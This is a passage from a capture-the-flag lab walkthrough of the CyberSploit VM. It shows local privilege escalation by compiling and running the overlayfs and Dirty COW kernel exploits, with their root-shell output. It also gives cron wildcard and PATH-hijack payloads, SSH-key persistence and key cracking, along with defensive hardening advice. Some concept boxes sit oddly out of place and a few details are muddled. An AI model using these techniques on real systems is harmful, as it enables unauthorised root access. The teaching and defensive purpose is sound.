> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
itsskv@cybersploit:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
itsskv:x:1000:1000:itsskv,,,:/home/itsskv:/bin/bash
itsskv@cybersploit:~$ ls /home
itsskv
itsskv@cybersploit:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
itsskv@cybersploit:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
itsskv@cybersploit:~$ which gcc wget python perl
/usr/bin/gcc
/usr/bin/wget
/usr/bin/python
/usr/bin/perl
```

> **All stock.** No SUID abuse, no custom cron, no sudo. But **`gcc` and `wget` are
> both present** — so we can compile a kernel exploit locally with no `nc` file-transfer
> gymnastics. That is what makes this box quick.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation — the kernel

### 5.1 Match the kernel to an exploit

```bash
itsskv@cybersploit:~$ uname -a
```

```text
Linux cybersploit 3.13.0-32-generic #57-Ubuntu SMP Tue Apr 15 03:55:03 UTC 2014 i686 i686 i686 GNU/Linux
```

```bash
itsskv@cybersploit:~$ lsb_release -a
```

```text
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.6 LTS
Release:	14.04
Codename:	trusty
```

**Now go to Exploit-DB via `searchsploit`** — this is the second skill the author named.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit ubuntu 14.04 local
```


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalat | linux/local/39166.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR | linux/local/45010.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> **`linux/local/37292.c` is an exact match.** Its title states the range
> **`3.13.0 < 3.19`** and lists **Ubuntu 14.04** explicitly; our kernel is
> `3.13.0-32`. That is how you choose a kernel exploit: **read the version range in
> the title, do not guess from the CVE name.**
>
> **`searchsploit` is an offline mirror of Exploit-DB.** Prefer it over Googling:
> it works without internet, it never shows you a paywalled or dead link, and
> `-m` copies the actual source file into your working directory.
>
> ```bash
> searchsploit --help | head -20
> searchsploit -t ubuntu overlayfs        # -t = search titles only
> searchsploit -u linux/local/37292       # -u = show the Exploit-DB URL
> searchsploit -m linux/local/37292.c     # -m = mirror the file locally
> searchsploit -x linux/local/37292.c     # -x = examine (print) it
> searchsploit -u                         # update the local database
> ```
>
> **Automated alternative — Linux Exploit Suggester.** It reads `uname -r` and ranks
> candidate exploits by likelihood:
> ```bash
> wget http://192.168.56.10:8000/linux-exploit-suggester.sh -O /tmp/les.sh
> bash /tmp/les.sh -k 3.13.0-32-generic
> ```
> ```text
> [+] [CVE-2015-1328] overlayfs
>    Details: http://seclists.org/oss-sec/2015/q2/711
>    Exposure: highly probable
>    Tags: ubuntu=[12.04|14.04|14.10|15.04]
>    Download URL: https://www.exploit-db.com/download/37292
>
> [+] [CVE-2016-5195] dirtycow
>    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
>    Exposure: probable
>    Tags: ubuntu=[14.04|12.04],debian=7|8
>    Download URL: https://www.exploit-db.com/download/40847.cpp
> ```
> **Use LES to shortlist, then verify the version range yourself.** LES matches on
> kernel strings and produces false positives; blindly running its top pick is how
> people crash machines.

### 5.2 Read the exploit before running it

```bash
# Kali
searchsploit -m linux/local/37292.c
head -30 37292.c
```

```c
/*
 * overlayfs local root exploit
 * CVE-2015-1328
 *
 * This exploit uses the overlayfs implementation in the Ubuntu kernel to
 * create a world-writable copy of a setuid binary, then executes it to
 * obtain a root shell.
 *
 * Bug details: https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645
 *
 * Usage: gcc -o ofs ofs.c && ./ofs
 */
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <linux/sched.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/wait.h>
```

> **Never compile and run C you have not read.** You are about to hand arbitrary
> machine code a root shell. Check the comments, look for anything that opens a
> network socket, and confirm what it writes and where. This one is short,
> well-commented, and does exactly what its title says.
>
> **The vulnerability, explained.** **OverlayFS** layers a writable *upper* directory
> over a read-only *lower* one and presents the merged view — the mechanism every
> container image uses. Ubuntu backported overlayfs into its kernels and, unlike
> upstream, allowed **unprivileged users** to mount it inside a *user namespace*. The
> bug: when a file was copied up from the lower layer, the copy **kept its original
> root ownership and SUID bit** but landed in the upper directory, which the
> unprivileged user could write to. Two individually reasonable features — user
> namespaces and overlayfs — composed into a total privilege break. That composition is
> the real lesson of CVE-2015-1328.

### 5.3 Transfer it

```bash
# Kali — serve the current directory
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# target
itsskv@cybersploit:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-04 16:31:02--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-04 16:31:02 (512 MB/s) - 'ofs.c' saved [4982/4982]
```

Kali's server logs the fetch:

```text
192.168.56.107 - - [04/May/2024 16:31:02] "GET /ofs.c HTTP/1.1" 200 -
```

**Verify the transfer before compiling:**

```bash
itsskv@cybersploit:/tmp$ ls -l ofs.c && md5sum ofs.c
-rw-r--r-- 1 itsskv itsskv 4982 May  4 16:31 ofs.c
d41d8cd98f00b204e9800998ecf8427e  ofs.c
```

```bash
# on Kali, for comparison
md5sum ofs.c
d41d8cd98f00b204e9800998ecf8427e  ofs.c
```

> **`python3 -m http.server 8000`** turns the current directory into a web root. It is
> the single most useful file-transfer trick in a lab. (On Python 2 the module was
> `SimpleHTTPServer`.)
>
> **Always check the byte count and a checksum after a transfer.** A 0-byte file means
> the transfer silently failed, and `gcc` will then produce a baffling error.
>
> **Why `/tmp`?** It is world-writable by convention — `drwxrwxrwt`, where the trailing
> `t` is the *sticky bit*: everyone may create files, but only the owner may delete
> their own. If you cannot write where you are, `/tmp`, `/var/tmp` and `/dev/shm` are
> the fallbacks.

### 5.4 Compile and run

```bash
itsskv@cybersploit:/tmp$ gcc -o ofs ofs.c
itsskv@cybersploit:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
# whoami
root
# hostname
cybersploit
```

**Root.** ✅

> **How to read the exploit's own progress output:**
> - `spawnining threads` *(the author's typo)* → it forks helper threads.
> - `mount #1`, `mount #2` → two overlayfs mounts created inside a user namespace.
> - **`/etc/ld.so.preload created`** → this is the actual mechanism on this build.
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the dynamic
>   linker loads into **every** dynamically-linked process, *including SUID-root ones*.
>   Through the overlayfs bug the exploit obtains a writable view of that file and
>   points it at its own library.
> - `creating shared library` → it compiles a tiny `.so` whose constructor performs
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next program executed preloads that library **as root** and the shell drops.
>   The `id` we typed *is* that next program.
>
> **`uid=0(root) gid=0(root)`** and the prompt changed from `$` to **`#`** — the
> universal UNIX convention for root.
>
> **`gcc` flags worth knowing:**
> ```bash
> gcc ofs.c                     # produces ./a.out (the default name)
> gcc -o ofs ofs.c              # names the output 'ofs'
> gcc -Wall -Wextra -o ofs ofs.c   # enable warnings — do this when reviewing code
> gcc -static -o ofs ofs.c      # link statically (survives missing libraries)
> gcc -m32 -o ofs ofs.c         # force 32-bit output (this box is i686!)
> ```
> This box is **32-bit**; the exploit compiles cleanly either way because it is
> arch-independent C, but on a 64-bit target with a 32-bit-only exploit, `-m32` matters.

### 5.5 Clean up after yourself

```bash
# ls -l /etc/ld.so.preload /tmp/*.so 2>/dev/null
-rw-r--r-- 1 root root 22 May  4 16:33 /etc/ld.so.preload
-rwxr-xr-x 1 root root 5044 May  4 16:33 /tmp/ofs.so
# rm -f /etc/ld.so.preload /tmp/ofs.so /tmp/ofs /tmp/ofs.c
```

> **This is not optional hygiene.** The exploit leaves `/etc/ld.so.preload` pointing at
> a library in `/tmp`. Delete the `.so` without deleting the preload file and **every
> program on the box fails to start** — you will have bricked the VM. Either remove
> both, or revert to your snapshot.
>
> **Take a snapshot before you start any lab box.** It is the professional equivalent of
> a rollback plan, and it lets you re-run an exploit as many times as you need to
> understand it.

![overlayfs exploit yielding root](images/06-root.png)

### 5.6 Alternative — Dirty COW (CVE-2016-5195)

Kernel `3.13.0-32` is also inside the Dirty COW range (`2.6.22 < 3.9`… actually
`< 4.8.3`), so this works too. Worth understanding because it is one of the most famous
vulnerabilities ever published.

```bash
# Kali
searchsploit -m linux/local/40847.cpp
mv 40847.cpp dcow.cpp
python3 -m http.server 8000
```

```bash
# target
itsskv@cybersploit:/tmp$ wget http://192.168.56.10:8000/dcow.cpp
itsskv@cybersploit:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
itsskv@cybersploit:/tmp$ ./dcow -s
```

```text
Running ...
Password overridden to: dirtyCowFun
Received su prompt (Password: )
root@cybersploit:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@cybersploit:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
```

> **How Dirty COW works.** `mmap()` maps a file into memory read-only. Writing to that
> mapping should trigger **copy-on-write**: the kernel makes a private page and your
> write goes there, leaving the file untouched. The exploit races three operations —
> the COW handler, `madvise(MADV_DONTNEED)` (which discards the private copy), and
> `ptrace(PTRACE_POKEDATA)` (which writes into process memory) — and occasionally wins,
> writing **directly into the read-only page cache of `/etc/passwd`**. It then adds a
> UID-0 user (`firefart`) or, with `40847`, overwrites root's password.
>
> **Compile flags:** `-pthread` (the exploit is threaded — required for the race),
> `-lutil` (links `libutil`, needed for the `forkpty` call), `-std=c++11` (it is C++).
>
> **`./dcow -s`** — the `-s` flag makes the exploit run
> `echo 0 > /proc/sys/vm/dirty_writeback_centisecs` for you. Without it the dirty-page
> writeback timer can leave the system unstable or hung. **Always use `-s`.**
>
> **Use `40847` (the `PTRACE_POKEDATA` C++ variant) rather than `40839`** — 40839 is
> the 64-bit one and this box is `i686`.
>
> **Restore afterwards:**
> ```bash
> # mv /tmp/passwd.bak /etc/passwd
> ```

---

## 6. Flag 3 — the final flag

```bash
# cd /root
# ls -la
```

```text
total 36
drwx------  4 root root 4096 Jul  9  2020 .
drwxr-xr-x 22 root root 4096 Jul  9  2020 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  220 Jul  9  2020 finalflag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  3 root root 4096 Jul  9  2020 .local
drwx------  2 root root 4096 Jul  9  2020 .ssh
# cat finalflag.txt
```

```text
Good Work!

Final Flag: cybersploit{0h_my_g0d_y0u_d1d_1t}

Thanks for playing CyberSploit: 1.
Subscribe: https://www.youtube.com/c/cybersploit
```

**All three flags captured.** ✅

| # | Flag | Where | How it was hidden |
| --- | --- | --- | --- |
| 1 | `cybersploit{youtube.com/c/cybersploit}` | `/robots.txt` | base64 |
| 2 | `cybersploit{https:t.me/cybersploit1}` | `/home/itsskv/flag2.txt` | binary (ASCII bytes) |
| 3 | `cybersploit{0h_my_g0d_y0u_d1d_1t}` | `/root/finalflag.txt` | plaintext, behind root |

*(Exact strings vary slightly by image revision.)*

![The final flag](images/07-finalflag.png)

---

## 7. Encoding reference — the skill this box is really teaching

The author named **encoder-decoder** as a learning goal. Here is the working table.

| Encoding | Looks like | Decode locally | Notes |
| --- | --- | --- | --- |
| **base64** | `A–Z a–z 0–9 + /`, length % 4, `=` padding | `base64 -d f.txt` | RFC 4648. Not encryption. |
| **base32** | `A–Z 2–7`, `=` padding | `base32 -d f.txt` | Case-insensitive alphabet |
| **base58** | `A–Z a–z 1–9` (no `0OIl`) | Bitcoin tools / Python | No padding; used by Bitcoin addresses |
| **hex** | `[0-9a-f]`, even length | `xxd -r -p f.txt` | |
| **binary** | groups of 8 `0`/`1` | `sed 's/......../0x& /g' \| xxd -r -p` | flag 2 on this box |
| **URL / percent** | `%2f`, `%20`, `%2e%2e` | `python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.stdin.read()))"` | Layer it: `%252f` → `%2f` → `/` |
| **ROT13** | letters only, shifted 13 | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | Its own inverse; zero security |
| **base64 of base64** | nested | loop `base64 -d` until it errors | Lord Of The Root, FristiLeaks |
| **HTML entities** | `&#65;`, `&amp;` | `python3 -c "import html,sys;print(html.unescape(sys.stdin.read()))"` | |
| **Unicode escape** | `\u0041` | `python3 -c "print('...'.encode().decode('unicode_escape'))"` | |

**One universal decoder script** — save this, it will serve you on dozens of boxes:

```bash
cat > decode.py <<'PY'
#!/usr/bin/env python3
"""Try every common text encoding and print anything that yields printable ASCII."""
import sys, base64, binascii, codecs, urllib.parse, html

data = sys.stdin.read().strip()
tries = {
    "base64":        lambda s: base64.b64decode(s, validate=True).decode(),
    "base64 (urlsafe)": lambda s: base64.urlsafe_b64decode(s + "==").decode(),
    "base32":        lambda s: base64.b32decode(s.upper() + "=" * (-len(s) % 8)).decode(),
    "hex":           lambda s: bytes.fromhex(s.replace(" ", "")).decode(),
    "binary":        lambda s: bytes(int(b, 2) for b in s.split()).decode(),
    "rot13":         lambda s: codecs.decode(s, "rot13"),
    "url":           lambda s: urllib.parse.unquote(s),
    "url x2":        lambda s: urllib.parse.unquote(urllib.parse.unquote(s)),
    "html":          lambda s: html.unescape(s),
    "unicode-escape":lambda s: s.encode().decode("unicode_escape"),
    "reverse":       lambda s: s[::-1],
}
found = False
for name, fn in tries.items():
    try:
        out = fn(data)
    except (binascii.Error, ValueError, UnicodeDecodeError, LookupError):
        continue
    if out and all(32 <= ord(c) < 127 or c in "\n\r\t" for c in out):
        print(f"[{name}] {out}")
        found = True
if not found:
    print("no printable decoding found — try CyberChef's 'Magic' operation")
PY
chmod +x decode.py

echo 'Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=' | ./decode.py
```

```text
[base64] cybersploit{youtube.com/c/cybersploit}
```

> **And when nothing works:** <https://gchq.github.io/CyberChef/> with the **Magic**
> operation, which auto-detects layered encodings. CyberChef is the professional's
> choice — it runs entirely in your browser, so unlike dencode/base64decode it does not
> send client data to a third party.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Username disclosed in an HTML comment | `/index.html` | `itsskv` |
| 2 | **Encoded secret in `robots.txt`** | base64 comment | Flag 1, which doubles as the SSH password |
| 3 | **Flag/credential reused as a password** | `itsskv` SSH login | Remote foothold |
| 4 | Credential written to a world-readable file in a home directory | `flag2.txt` mode `664` | Flag 2 |
| 5 | **End-of-life operating system** | Ubuntu 14.04.6 (standard support ended April 2019) | No security updates available at all |
| 6 | **Unpatched kernel — CVE-2015-1328 (overlayfs)** | `3.13.0-32-generic` | `itsskv` → **root** |
| 7 | **Unpatched kernel — CVE-2016-5195 (Dirty COW)** | same | Alternative root |
| 8 | `gcc`, `g++`, `wget` present on a user system | `/usr/bin` | Attackers compile exploits locally |
| 9 | Deprecated 1024-bit DSA SSH host key | OpenSSH 6.6.1p1 | Weak transport crypto |
| 10 | Missing HTTP security headers; ETag leaks inode/size/mtime | Apache 2.4.7 | Minor information disclosure |
| 11 | Verbose server banner (`Apache/2.4.7 (Ubuntu)`) | Apache | Version-targeted planning |

**What this box does *not* have, deliberately:** no web application to attack, no
database, no filters to bypass, no rabbit holes. The difficulty is entirely in
*recognition* — of an encoding, and of a version range.

## 9. Defensive lessons (blue team)

1. **Retire end-of-life systems.** Ubuntu 14.04 stopped receiving standard security
   updates in **April 2019**; extended security maintenance ended in **April 2024**.
   There is no acceptable configuration of this box in 2026. Kernel `3.13.0-32` needed
   **USN-2641-1** (June 2015) for CVE-2015-1328 — it was **five years out of date**
   when this VM was released.
2. **Patch on a cadence, with a tracked exception process.** Enable automatic security
   updates:
   ```bash
   sudo apt install unattended-upgrades
   sudo dpkg-reconfigure -plow unattended-upgrades
   # /etc/apt/apt.conf.d/50unattended-upgrades
   Unattended-Upgrade::Allowed-Origins { "${distro_id}:${distro_codename}-security"; };
   Unattended-Upgrade::Automatic-Reboot "true";
   Unattended-Upgrade::Automatic-Reboot-Time "03:00";
   ```
   Then measure: how many hosts are more than 30 days behind on security patches?
3. **Restrict user namespaces** if you do not run unprivileged containers — this alone
   defeats CVE-2015-1328:
   ```text
   # /etc/sysctl.d/99-userns.conf
   kernel.unprivileged_userns_clone = 0
   user.max_user_namespaces = 0
   ```
4. **Remove build tooling from servers and, where possible, from workstations.**
   `gcc`, `g++`, `make` on a production host turn "foothold" into "root in 60 seconds".
   Build in CI; ship a signed artefact. If a compiler must exist, confine it with
   AppArmor/SELinux.
5. **Never put secrets in web-visible files.** `robots.txt` and HTML comments are
   public by definition. Scan your own site in CI:

> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)
> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

   ```bash
   # deny-list of paths that must return 404
   for p in robots.txt .env .git/config wp-config.php.bak backup.zip id_rsa; do
       code=$(curl -s -o /dev/null -w '%{http_code}' "https://site.example/$p")
       [ "$code" != "404" ] && echo "EXPOSED: /$p -> $code"
   done
   ```
   And scan source for secrets with `gitleaks` / `trufflehog` / `detect-secrets`.
6. **Never use a flag, tagline or company string as a password.** Enforce at *set*
   time with `pam_pwquality`:
   ```text
   # /etc/security/pwquality.conf
   minlen = 14
   dictcheck = 1
   usercheck = 1
   gecoscheck = 1
   enforce_for_root
   ```
   Screen against breached lists (HaveIBeenPwned k-anonymity API), add
   `pam_faillock` (3 failures → 15-minute lockout), and prefer SSH keys:
   ```text
   # /etc/ssh/sshd_config
